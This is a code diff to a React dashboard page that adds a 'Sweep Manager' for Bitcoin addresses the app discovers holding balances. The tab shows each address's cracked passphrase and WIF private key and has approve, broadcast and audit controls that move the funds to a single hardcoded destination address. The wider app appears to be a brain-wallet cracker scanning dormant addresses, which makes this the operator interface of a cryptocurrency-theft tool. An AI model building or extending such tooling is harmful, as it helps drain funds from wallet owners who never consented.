@@ -8,7 +8,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Progress } from "@/components/ui/progress";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
-import { Database, TrendingDown, Activity, Archive, Mail, Search, Users, Clock, Target, Sparkles, LineChart, Plus, X, Terminal, RefreshCw, Play, Pause } from "lucide-react";
+import { Database, TrendingDown, Activity, Archive, Mail, Search, Users, Clock, Target, Sparkles, LineChart, Plus, X, Terminal, RefreshCw, Play, Pause, Wallet, CheckCircle, XCircle, Send, AlertTriangle, History, DollarSign } from "lucide-react";
 import { ScatterChart, Scatter, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer, Cell, ZAxis } from 'recharts';
 import { useToast } from "@/hooks/use-toast";
 import { queryClient, apiRequest } from "@/lib/queryClient";
@@ -64,6 +64,7 @@ interface BalanceQueueStatus {
   total: number;
   addressesPerSecond: number;
   isProcessing: boolean;
+  initializing?: boolean;
 }
 
 interface BackgroundWorkerStatus {
@@ -72,6 +73,7 @@ interface BackgroundWorkerStatus {
   hits: number;
   rate: number;
   pending: number;
+  initializing?: boolean;
 }
 
 interface DormantCrossRefStats {
@@ -89,6 +91,53 @@ interface DormantCrossRefStats {
     usd: number;
   };
 }
+
+interface PendingSweep {
+  id: string;
+  address: string;
+  passphrase: string;
+  wif: string;
+  isCompressed: boolean;
+  balanceSats: number;
+  balanceBtc: string;
+  estimatedFeeSats: number;
+  netAmountSats: number;
+  utxoCount: number;
+  status: 'pending' | 'approved' | 'broadcasting' | 'completed' | 'failed' | 'rejected' | 'expired';
+  source: string;
+  recoveryType?: string;
+  destinationAddress: string;
+  discoveredAt: string;
+  approvedAt?: string;
+  approvedBy?: string;
+  broadcastAt?: string;
+  completedAt?: string;
+  txId?: string;
+  errorMessage?: string;
+}
+
+interface SweepStats {
+  pending: number;
+  approved: number;
+  completed: number;
+  failed: number;
+  rejected: number;
+  totalPendingBtc: string;
+  totalSweptBtc: string;
+}
+
+interface SweepAuditEntry {
+  id: string;
+  sweepId: string;
+  action: string;
+  previousStatus?: string;
+  newStatus?: string;
+  performedBy: string;
+  details?: string;
+  timestamp: string;
+}
+
+const HARDCODED_DESTINATION = "bc1qcc0ln7gg92vlclfw8t39zfw2cfqtytcwum733l";
 
 export default function ObserverPage() {
   const { toast } = useToast();
@@ -161,6 +210,127 @@ export default function ObserverPage() {
   const { data: dormantCrossRefData, isLoading: dormantCrossRefLoading } = useQuery<DormantCrossRefStats>({
     queryKey: ['/api/dormant-crossref/stats'],
     refetchInterval: 10000, // Poll every 10 seconds
+  });
+
+  // Sweep status filter state
+  const [sweepStatusFilter, setSweepStatusFilter] = useState<string>("all");
+
+  // Query pending sweeps
+  const { data: sweepsData, isLoading: sweepsLoading, error: sweepsError } = useQuery<{ success: boolean; sweeps: PendingSweep[] }>({
+    queryKey: ['/api/sweeps', sweepStatusFilter],
+    queryFn: async () => {
+      const url = sweepStatusFilter === 'all' ? '/api/sweeps' : `/api/sweeps?status=${sweepStatusFilter}`;
+      const res = await fetch(url);
+      if (!res.ok) throw new Error('Failed to fetch sweeps');
+      return res.json();
+    },
+    refetchInterval: 5000,
+  });
+
+  // Query sweep stats
+  const { data: sweepStatsData, isLoading: sweepStatsLoading } = useQuery<{ success: boolean; stats: SweepStats }>({
+    queryKey: ['/api/sweeps/stats'],
+    refetchInterval: 5000,
+  });
+
+  // Query audit log (optional - only when viewing details)
+  const [selectedSweepId, setSelectedSweepId] = useState<string | null>(null);
+  const { data: auditData } = useQuery<{ success: boolean; auditLog: SweepAuditEntry[] }>({
+    queryKey: ['/api/sweeps/audit', selectedSweepId],
+    queryFn: async () => {
+      if (!selectedSweepId) return { success: true, auditLog: [] };
+      const res = await fetch(`/api/sweeps/audit/${selectedSweepId}`);
+      if (!res.ok) throw new Error('Failed to fetch audit log');
+      return res.json();
+    },
+    enabled: !!selectedSweepId,
+  });
+
+  // Approve sweep mutation
+  const approveSweepMutation = useMutation({
+    mutationFn: async (id: string) => {
+      return await apiRequest("POST", `/api/sweeps/${id}/approve`, undefined);
+    },
+    onSuccess: () => {
+      queryClient.invalidateQueries({ queryKey: ['/api/sweeps'] });
+      queryClient.invalidateQueries({ queryKey: ['/api/sweeps/stats'] });
+      toast({
+        title: "Sweep Approved",
+        description: "The sweep has been approved and is ready for broadcast",
+      });
+    },
+    onError: (error: any) => {
+      toast({
+        title: "Error",
+        description: error.message || "Failed to approve sweep",
+        variant: "destructive",
+      });
+    },
+  });
+
+  // Reject sweep mutation
+  const rejectSweepMutation = useMutation({
+    mutationFn: async ({ id, reason }: { id: string; reason: string }) => {
+      return await apiRequest("POST", `/api/sweeps/${id}/reject`, { reason });
+    },
+    onSuccess: () => {
+      queryClient.invalidateQueries({ queryKey: ['/api/sweeps'] });
+      queryClient.invalidateQueries({ queryKey: ['/api/sweeps/stats'] });
+      toast({
+        title: "Sweep Rejected",
+        description: "The sweep has been rejected",
+      });
+    },
+    onError: (error: any) => {
+      toast({
+        title: "Error",
+        description: error.message || "Failed to reject sweep",
+        variant: "destructive",
+      });
+    },
+  });
+
+  // Broadcast sweep mutation
+  const broadcastSweepMutation = useMutation({
+    mutationFn: async (id: string) => {
+      return await apiRequest("POST", `/api/sweeps/${id}/broadcast`, undefined);
+    },
+    onSuccess: (data: any) => {
+      queryClient.invalidateQueries({ queryKey: ['/api/sweeps'] });
+      queryClient.invalidateQueries({ queryKey: ['/api/sweeps/stats'] });
+      toast({
+        title: "Sweep Broadcast",
+        description: data.txId ? `Transaction broadcast: ${data.txId.slice(0, 16)}...` : "Transaction broadcast initiated",
+      });
+    },
+    onError: (error: any) => {
+      toast({
+        title: "Broadcast Failed",
+        description: error.message || "Failed to broadcast sweep",
+        variant: "destructive",
+      });
+    },
+  });
+
+  // Refresh sweep balance mutation
+  const refreshSweepMutation = useMutation({
+    mutationFn: async (id: string) => {
+      return await apiRequest("POST", `/api/sweeps/${id}/refresh`, undefined);
+    },
+    onSuccess: () => {
+      queryClient.invalidateQueries({ queryKey: ['/api/sweeps'] });
+      toast({
+        title: "Balance Refreshed",
+        description: "Sweep balance has been updated",
+      });
+    },
+    onError: (error: any) => {
+      toast({
+        title: "Error",
+        description: error.message || "Failed to refresh balance",
+        variant: "destructive",
+      });
+    },
   });
 
   // Start background worker mutation
@@ -347,54 +517,73 @@ export default function ObserverPage() {
             <div className="mb-4 p-3 rounded-lg border bg-card">
               <div className="flex items-center justify-between gap-4 flex-wrap">
                 <div className="flex items-center gap-2">
-                  <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
-                  <span className="text-sm font-medium text-green-600" data-testid="text-worker-status">
-                    Background Worker Active (Always On)
-                  </span>
+                  {bgWorkerData?.initializing ? (
+                    <>
+                      <RefreshCw className="w-4 h-4 text-blue-500 animate-spin" />
+                      <span className="text-sm font-medium text-blue-600" data-testid="text-worker-status">
+                        Initializing...
+                      </span>
+                    </>
+                  ) : (
+                    <>
+                      <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
+                      <span className="text-sm font-medium text-green-600" data-testid="text-worker-status">
+                        Background Worker Active (Always On)
+                      </span>
+                    </>
+                  )}
                 </div>
                 <div className="flex items-center gap-4 text-sm text-muted-foreground">
                   <span data-testid="text-worker-checked">
-                    Checked: <strong className="text-foreground">{bgWorkerLoading ? "..." : bgWorkerData?.checked || 0}</strong>
+                    Checked: <strong className="text-foreground">{bgWorkerLoading || bgWorkerData?.initializing ? "..." : bgWorkerData?.checked || 0}</strong>
                   </span>
                   <span data-testid="text-worker-hits">
-                    Hits: <strong className="text-green-600">{bgWorkerLoading ? "..." : bgWorkerData?.hits || 0}</strong>
+                    Hits: <strong className="text-green-600">{bgWorkerLoading || bgWorkerData?.initializing ? "..." : bgWorkerData?.hits || 0}</strong>
                   </span>
                   <span data-testid="text-worker-rate">
-                    Rate: <strong className="text-foreground">{bgWorkerLoading ? "..." : (bgWorkerData?.rate?.toFixed(2) || "0.00")}/sec</strong>
+                    Rate: <strong className="text-foreground">{bgWorkerLoading || bgWorkerData?.initializing ? "..." : (bgWorkerData?.rate?.toFixed(2) || "0.00")}/sec</strong>
                   </span>
                 </div>
               </div>
             </div>
 
             {/* Queue Stats Grid */}
+            {balanceQueueData?.initializing && (
+              <div className="mb-3 p-2 rounded bg-blue-500/10 border border-blue-500/20 text-center">
+                <span className="text-sm text-blue-600 flex items-center justify-center gap-2">
+                  <RefreshCw className="w-4 h-4 animate-spin" />
+                  Loading queue data...
+                </span>
+              </div>
+            )}
             <div className="grid grid-cols-2 md:grid-cols-5 gap-4">
               <div className="text-center p-3 rounded-lg bg-muted/50">
                 <div className="text-2xl font-bold text-orange-500" data-testid="text-queue-pending">
-                  {balanceQueueLoading ? "..." : balanceQueueData?.pending || 0}
+                  {balanceQueueLoading || balanceQueueData?.initializing ? "..." : balanceQueueData?.pending || 0}
                 </div>
                 <p className="text-xs text-muted-foreground">Pending</p>
               </div>
               <div className="text-center p-3 rounded-lg bg-muted/50">
                 <div className="text-2xl font-bold text-blue-500" data-testid="text-queue-checking">
-                  {balanceQueueLoading ? "..." : balanceQueueData?.checking || 0}
+                  {balanceQueueLoading || balanceQueueData?.initializing ? "..." : balanceQueueData?.checking || 0}
                 </div>
                 <p className="text-xs text-muted-foreground">Checking</p>
               </div>
               <div className="text-center p-3 rounded-lg bg-muted/50">
                 <div className="text-2xl font-bold text-green-500" data-testid="text-queue-resolved">
-                  {balanceQueueLoading ? "..." : balanceQueueData?.resolved || 0}
+                  {balanceQueueLoading || balanceQueueData?.initializing ? "..." : balanceQueueData?.resolved || 0}
                 </div>
                 <p className="text-xs text-muted-foreground">Resolved</p>
               </div>
               <div className="text-center p-3 rounded-lg bg-muted/50">
                 <div className="text-2xl font-bold text-destructive" data-testid="text-queue-failed">
-                  {balanceQueueLoading ? "..." : balanceQueueData?.failed || 0}
+                  {balanceQueueLoading || balanceQueueData?.initializing ? "..." : balanceQueueData?.failed || 0}
                 </div>
                 <p className="text-xs text-muted-foreground">Failed</p>
               </div>
               <div className="text-center p-3 rounded-lg bg-muted/50">
                 <div className="text-2xl font-bold" data-testid="text-queue-total">
-                  {balanceQueueLoading ? "..." : balanceQueueData?.total || 0}
+                  {balanceQueueLoading || balanceQueueData?.initializing ? "..." : balanceQueueData?.total || 0}
                 </div>
                 <p className="text-xs text-muted-foreground">Total</p>
               </div>
@@ -484,6 +673,15 @@ export default function ObserverPage() {
             <TabsTrigger value="activity" data-testid="tab-activity">
               <Terminal className="w-4 h-4 mr-2" />
               Live Activity
+            </TabsTrigger>
+            <TabsTrigger value="sweeps" data-testid="tab-sweeps">
+              <Wallet className="w-4 h-4 mr-2" />
+              Sweep Manager
+              {(sweepStatsData?.stats?.pending || 0) > 0 && (
+                <Badge variant="outline" className="ml-2 bg-orange-500/10 text-orange-600 border-orange-500/30">
+                  {sweepStatsData?.stats?.pending}
+                </Badge>
+              )}
             </TabsTrigger>
           </TabsList>
 
@@ -1159,6 +1357,152 @@ export default function ObserverPage() {
               </CardContent>
             </Card>
           </TabsContent>
+
+          {/* Sweep Manager Tab */}
+          <TabsContent value="sweeps" className="space-y-4">
+            {/* Destination Address Banner */}
+            <Card className="border-primary/50 bg-primary/5" data-testid="card-destination-address">
+              <CardContent className="py-4">
+                <div className="flex items-center justify-between gap-4 flex-wrap">
+                  <div className="flex items-center gap-3">
+                    <Wallet className="w-5 h-5 text-primary" />
+                    <div>
+                      <p className="text-sm font-medium">Hardcoded Destination Address</p>
+                      <p className="text-xs text-muted-foreground">All swept funds go here (immutable)</p>
+                    </div>
+                  </div>
+                  <div className="font-mono text-sm bg-background px-3 py-1.5 rounded border" data-testid="text-destination-address">
+                    {HARDCODED_DESTINATION}
+                  </div>
+                </div>
+              </CardContent>
+            </Card>
+
+            {/* Sweep Stats Overview */}
+            <Card data-testid="card-sweep-stats">
+              <CardHeader className="pb-3">
+                <CardTitle className="text-lg flex items-center gap-2">
+                  <DollarSign className="w-5 h-5 text-green-600" />
+                  Sweep Statistics
+                </CardTitle>
+              </CardHeader>
+              <CardContent>
+                <div className="grid grid-cols-2 md:grid-cols-5 gap-4">
+                  <div className="text-center p-3 rounded-lg bg-orange-500/10 border border-orange-500/20">
+                    <div className="text-2xl font-bold text-orange-500" data-testid="text-sweep-pending">
+                      {sweepStatsLoading ? "..." : sweepStatsData?.stats?.pending || 0}
+                    </div>
+                    <p className="text-xs text-muted-foreground">Pending</p>
+                  </div>
+                  <div className="text-center p-3 rounded-lg bg-blue-500/10 border border-blue-500/20">
+                    <div className="text-2xl font-bold text-blue-500" data-testid="text-sweep-approved">
+                      {sweepStatsLoading ? "..." : sweepStatsData?.stats?.approved || 0}
+                    </div>
+                    <p className="text-xs text-muted-foreground">Approved</p>
+                  </div>
+                  <div className="text-center p-3 rounded-lg bg-green-500/10 border border-green-500/20">
+                    <div className="text-2xl font-bold text-green-500" data-testid="text-sweep-completed">
+                      {sweepStatsLoading ? "..." : sweepStatsData?.stats?.completed || 0}
+                    </div>
+                    <p className="text-xs text-muted-foreground">Completed</p>
+                  </div>
+                  <div className="text-center p-3 rounded-lg bg-red-500/10 border border-red-500/20">
+                    <div className="text-2xl font-bold text-red-500" data-testid="text-sweep-failed">
+                      {sweepStatsLoading ? "..." : sweepStatsData?.stats?.failed || 0}
+                    </div>
+                    <p className="text-xs text-muted-foreground">Failed</p>
+                  </div>
+                  <div className="text-center p-3 rounded-lg bg-muted/50">
+                    <div className="text-2xl font-bold" data-testid="text-sweep-rejected">
+                      {sweepStatsLoading ? "..." : sweepStatsData?.stats?.rejected || 0}
+                    </div>
+                    <p className="text-xs text-muted-foreground">Rejected</p>
+                  </div>
+                </div>
+                <div className="mt-4 grid grid-cols-2 gap-4">
+                  <div className="p-3 rounded-lg border bg-card">
+                    <p className="text-xs text-muted-foreground mb-1">Pending BTC Value</p>
+                    <p className="text-lg font-bold font-mono" data-testid="text-sweep-pending-btc">
+                      {sweepStatsLoading ? "..." : sweepStatsData?.stats?.totalPendingBtc || "0.00000000"} BTC
+                    </p>
+                  </div>
+                  <div className="p-3 rounded-lg border bg-card">
+                    <p className="text-xs text-muted-foreground mb-1">Total Swept</p>
+                    <p className="text-lg font-bold font-mono text-green-600" data-testid="text-sweep-total-btc">
+                      {sweepStatsLoading ? "..." : sweepStatsData?.stats?.totalSweptBtc || "0.00000000"} BTC
+                    </p>
+                  </div>
+                </div>
+              </CardContent>
+            </Card>
+
+            {/* Pending Sweeps List */}
+            <Card data-testid="card-sweep-list">
+              <CardHeader>
+                <div className="flex items-center justify-between gap-4 flex-wrap">
+                  <div>
+                    <CardTitle className="flex items-center gap-2">
+                      <AlertTriangle className="w-5 h-5 text-orange-500" />
+                      Sweep Approval Queue
+                    </CardTitle>
+                    <CardDescription>
+                      Review and approve sweeps before broadcasting transactions
+                    </CardDescription>
+                  </div>
+                  <Select value={sweepStatusFilter} onValueChange={setSweepStatusFilter}>
+                    <SelectTrigger className="w-40" data-testid="select-sweep-status-filter">
+                      <SelectValue placeholder="Filter status" />
+                    </SelectTrigger>
+                    <SelectContent>
+                      <SelectItem value="all">All Status</SelectItem>
+                      <SelectItem value="pending">Pending</SelectItem>
+                      <SelectItem value="approved">Approved</SelectItem>
+                      <SelectItem value="completed">Completed</SelectItem>
+                      <SelectItem value="failed">Failed</SelectItem>
+                      <SelectItem value="rejected">Rejected</SelectItem>
+                    </SelectContent>
+                  </Select>
+                </div>
+              </CardHeader>
+              <CardContent>
+                {sweepsLoading ? (
+                  <div className="text-center py-8 text-muted-foreground">Loading sweeps...</div>
+                ) : sweepsError ? (
+                  <div className="text-center py-8 text-destructive">
+                    Failed to load sweeps. Please try again.
+                  </div>
+                ) : !sweepsData?.sweeps || sweepsData.sweeps.length === 0 ? (
+                  <div className="text-center py-8 text-muted-foreground" data-testid="empty-sweeps">
+                    <Wallet className="w-12 h-12 mx-auto mb-4 opacity-50" />
+                    <p className="font-medium">No sweeps found</p>
+                    <p className="text-sm mt-2">
+                      Sweeps are created automatically when addresses with balance are discovered
+                    </p>
+                  </div>
+                ) : (
+                  <div className="space-y-3">
+                    {sweepsData.sweeps.map((sweep) => (
+                      <SweepItem
+                        key={sweep.id}
+                        sweep={sweep}
+                        onApprove={() => approveSweepMutation.mutate(sweep.id)}
+                        onReject={(reason) => rejectSweepMutation.mutate({ id: sweep.id, reason })}
+                        onBroadcast={() => broadcastSweepMutation.mutate(sweep.id)}
+                        onRefresh={() => refreshSweepMutation.mutate(sweep.id)}
+                        onViewAudit={() => setSelectedSweepId(selectedSweepId === sweep.id ? null : sweep.id)}
+                        isApproving={approveSweepMutation.isPending}
+                        isRejecting={rejectSweepMutation.isPending}
+                        isBroadcasting={broadcastSweepMutation.isPending}
+                        isRefreshing={refreshSweepMutation.isPending}
+                        showAudit={selectedSweepId === sweep.id}
+                        auditLog={selectedSweepId === sweep.id ? auditData?.auditLog : undefined}
+                      />
+                    ))}
+                  </div>
+                )}
+              </CardContent>
+            </Card>
+          </TabsContent>
         </Tabs>
 
         {/* Selected Address Details */}
@@ -1605,6 +1949,240 @@ function TemporalProgress({ workflow }: { workflow: RecoveryWorkflow }) {
       {temporal.archivesIdentified && temporal.archivesIdentified.length > 0 && (
         <div className="text-xs text-muted-foreground">
           <strong>Archives:</strong> {temporal.archivesIdentified.join(', ')}
+        </div>
+      )}
+    </div>
+  );
+}
+
+interface SweepItemProps {
+  sweep: PendingSweep;
+  onApprove: () => void;
+  onReject: (reason: string) => void;
+  onBroadcast: () => void;
+  onRefresh: () => void;
+  onViewAudit: () => void;
+  isApproving: boolean;
+  isRejecting: boolean;
+  isBroadcasting: boolean;
+  isRefreshing: boolean;
+  showAudit: boolean;
+  auditLog?: SweepAuditEntry[];
+}
+
+function SweepItem({
+  sweep,
+  onApprove,
+  onReject,
+  onBroadcast,
+  onRefresh,
+  onViewAudit,
+  isApproving,
+  isRejecting,
+  isBroadcasting,
+  isRefreshing,
+  showAudit,
+  auditLog,
+}: SweepItemProps) {
+  const getStatusConfig = (status: string) => {
+    switch (status) {
+      case 'pending':
+        return { label: 'Pending', icon: Clock, className: 'bg-orange-500/10 text-orange-600 border-orange-500/30' };
+      case 'approved':
+        return { label: 'Approved', icon: CheckCircle, className: 'bg-blue-500/10 text-blue-600 border-blue-500/30' };
+      case 'broadcasting':
+        return { label: 'Broadcasting', icon: Send, className: 'bg-purple-500/10 text-purple-600 border-purple-500/30' };
+      case 'completed':
+        return { label: 'Completed', icon: CheckCircle, className: 'bg-green-500/10 text-green-600 border-green-500/30' };
+      case 'failed':
+        return { label: 'Failed', icon: XCircle, className: 'bg-red-500/10 text-red-600 border-red-500/30' };
+      case 'rejected':
+        return { label: 'Rejected', icon: XCircle, className: 'bg-muted text-muted-foreground border-muted' };
+      case 'expired':
+        return { label: 'Expired', icon: Clock, className: 'bg-muted text-muted-foreground border-muted' };
+      default:
+        return { label: status, icon: Clock, className: 'bg-muted text-muted-foreground border-muted' };
+    }
+  };
+
+  const statusConfig = getStatusConfig(sweep.status);
+  const StatusIcon = statusConfig.icon;
+
+  return (
+    <div 
+      className="p-4 rounded-lg border bg-card space-y-3"
+      data-testid={`sweep-item-${sweep.id}`}
+    >
+      {/* Header Row */}
+      <div className="flex items-start justify-between gap-4 flex-wrap">
+        <div className="flex-1 min-w-0">
+          <div className="flex items-center gap-2 mb-1 flex-wrap">
+            <span className="font-mono text-sm font-medium truncate" data-testid={`text-sweep-address-${sweep.id}`}>
+              {sweep.address}
+            </span>
+            <Badge variant="outline" className={statusConfig.className}>
+              <StatusIcon className="w-3 h-3 mr-1" />
+              {statusConfig.label}
+            </Badge>
+            <Badge variant="outline" className="text-xs">
+              {sweep.source}
+            </Badge>
+            {sweep.isCompressed && (
+              <Badge variant="outline" className="text-xs bg-muted">Compressed</Badge>
+            )}
+          </div>
+          <div className="text-xs text-muted-foreground">
+            Discovered {new Date(sweep.discoveredAt).toLocaleString()}
+          </div>
+        </div>
+        <div className="text-right">
+          <div className="text-xl font-bold font-mono" data-testid={`text-sweep-balance-${sweep.id}`}>
+            {sweep.balanceBtc} BTC
+          </div>
+          <div className="text-xs text-muted-foreground">
+            {sweep.balanceSats.toLocaleString()} sats
+          </div>
+        </div>
+      </div>
+
+      {/* Balance Details */}
+      <div className="grid grid-cols-2 md:grid-cols-4 gap-3 text-sm">
+        <div className="p-2 rounded bg-muted/30">
+          <p className="text-xs text-muted-foreground">UTXOs</p>
+          <p className="font-mono font-medium">{sweep.utxoCount}</p>
+        </div>
+        <div className="p-2 rounded bg-muted/30">
+          <p className="text-xs text-muted-foreground">Est. Fee</p>
+          <p className="font-mono font-medium">{sweep.estimatedFeeSats.toLocaleString()} sats</p>
+        </div>
+        <div className="p-2 rounded bg-muted/30">
+          <p className="text-xs text-muted-foreground">Net Amount</p>
+          <p className="font-mono font-medium text-green-600">
+            {(sweep.netAmountSats / 100000000).toFixed(8)} BTC
+          </p>
+        </div>
+        <div className="p-2 rounded bg-muted/30">
+          <p className="text-xs text-muted-foreground">Passphrase</p>
+          <p className="font-mono text-xs truncate">{sweep.passphrase.slice(0, 20)}...</p>
+        </div>
+      </div>
+
+      {/* TX ID if completed */}
+      {sweep.txId && (
+        <div className="p-2 rounded bg-green-500/10 border border-green-500/20">
+          <p className="text-xs text-green-600 font-medium">Transaction ID:</p>
+          <p className="font-mono text-xs break-all">{sweep.txId}</p>
+        </div>
+      )}
+
+      {/* Error message if failed */}
+      {sweep.errorMessage && (
+        <div className="p-2 rounded bg-red-500/10 border border-red-500/20">
+          <p className="text-xs text-red-600 font-medium">Error:</p>
+          <p className="text-xs text-red-600">{sweep.errorMessage}</p>
+        </div>
+      )}
+
+      {/* Action Buttons */}
+      <div className="flex items-center gap-2 flex-wrap pt-2 border-t">
+        {sweep.status === 'pending' && (
+          <>
+            <Button
+              size="sm"
+              onClick={onApprove}
+              disabled={isApproving}
+              data-testid={`button-approve-sweep-${sweep.id}`}
+            >
+              <CheckCircle className="w-4 h-4 mr-1" />
+              {isApproving ? 'Approving...' : 'Approve'}
+            </Button>
+            <Button
+              size="sm"
+              variant="outline"
+              onClick={() => {
+                const reason = window.prompt('Reason for rejection (optional):') || 'Manual rejection';
+                onReject(reason);
+              }}
+              disabled={isRejecting}
+              data-testid={`button-reject-sweep-${sweep.id}`}
+            >
+              <XCircle className="w-4 h-4 mr-1" />
+              {isRejecting ? 'Rejecting...' : 'Reject'}
+            </Button>
+          </>
+        )}
+
+        {sweep.status === 'approved' && (
+          <Button
+            size="sm"
+            onClick={onBroadcast}
+            disabled={isBroadcasting}
+            className="bg-green-600 hover:bg-green-700"
+            data-testid={`button-broadcast-sweep-${sweep.id}`}
+          >
+            <Send className="w-4 h-4 mr-1" />
+            {isBroadcasting ? 'Broadcasting...' : 'Broadcast Transaction'}
+          </Button>
+        )}
+
+        {(sweep.status === 'pending' || sweep.status === 'approved') && (
+          <Button
+            size="sm"
+            variant="ghost"
+            onClick={onRefresh}
+            disabled={isRefreshing}
+            data-testid={`button-refresh-sweep-${sweep.id}`}
+          >
+            <RefreshCw className={`w-4 h-4 mr-1 ${isRefreshing ? 'animate-spin' : ''}`} />
+            Refresh Balance
+          </Button>
+        )}
+
+        <Button
+          size="sm"
+          variant="ghost"
+          onClick={onViewAudit}
+          data-testid={`button-audit-sweep-${sweep.id}`}
+        >
+          <History className="w-4 h-4 mr-1" />
+          {showAudit ? 'Hide' : 'View'} Audit Log
+        </Button>
+      </div>
+
+      {/* Audit Log */}
+      {showAudit && (
+        <div className="pt-3 border-t space-y-2">
+          <p className="text-sm font-medium flex items-center gap-2">
+            <History className="w-4 h-4" />
+            Audit Trail
+          </p>
+          {auditLog && auditLog.length > 0 ? (
+            <div className="space-y-1 max-h-40 overflow-y-auto">
+              {auditLog.map((entry) => (
+                <div 
+                  key={entry.id} 
+                  className="text-xs p-2 rounded bg-muted/30 flex items-start gap-2"
+                  data-testid={`audit-entry-${entry.id}`}
+                >
+                  <span className="text-muted-foreground whitespace-nowrap">
+                    {new Date(entry.timestamp).toLocaleString()}
+                  </span>
+                  <span className="font-medium capitalize">{entry.action}</span>
+                  {entry.previousStatus && entry.newStatus && (
+                    <span className="text-muted-foreground">
+                      {entry.previousStatus} → {entry.newStatus}
+                    </span>
+                  )}
+                  <span className="text-muted-foreground">by {entry.performedBy}</span>
+                  {entry.details && (
+                    <span className="text-muted-foreground italic truncate">{entry.details}</span>
+                  )}
+                </div>
+              ))}
+            </div>
+          ) : (
+            <p className="text-xs text-muted-foreground">Loading audit log...</p>
+          )}
         </div>
       )}
     </div>
